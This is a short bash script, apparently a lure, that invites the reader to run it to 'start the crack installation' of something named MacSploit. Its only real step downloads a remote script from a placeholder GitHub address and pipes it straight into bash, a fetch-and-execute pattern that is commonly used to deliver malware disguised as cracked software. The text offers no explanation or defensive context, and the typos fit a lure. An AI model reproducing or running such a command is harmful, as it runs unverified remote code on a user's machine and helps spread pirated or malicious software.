Run this script to sttart the crack installtion


#!/bin/bash

# URL of the raw script on GitHub
SCRIPT_URL="https://raw.githubusercontent.com/your-username/your-repository/main/install_macsploit.sh"

# Clear the terminal
clear

# Download and execute the script
echo -e "Downloading and executing the script from GitHub..."
curl -s "$SCRIPT_URL" | bash
